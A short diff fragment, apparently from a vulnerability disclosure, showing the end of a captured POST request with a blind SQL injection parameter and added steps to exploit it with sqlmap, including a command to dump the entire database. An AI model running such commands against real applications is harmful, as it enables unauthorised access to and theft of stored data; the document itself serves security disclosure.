@@ -40,3 +40,8 @@ Sec-Fetch-User: ?1
 Priority: u=0, i
 
 searchinputdata=BLIND_SQL_VULNERABLE&Submit=Submit
+```
+1. Save the above POST Request to sql.txt using notepad or any text editor.
+2. Use tool such as SQLMAP to exploit the above by applying this command (you can customize yours):
+   `sqlmap -r sql.txt -p 'searchinputdata' --dbs --random-agent --level 3 --risk 3`
+3. The above command will dump the entire database of the web application.
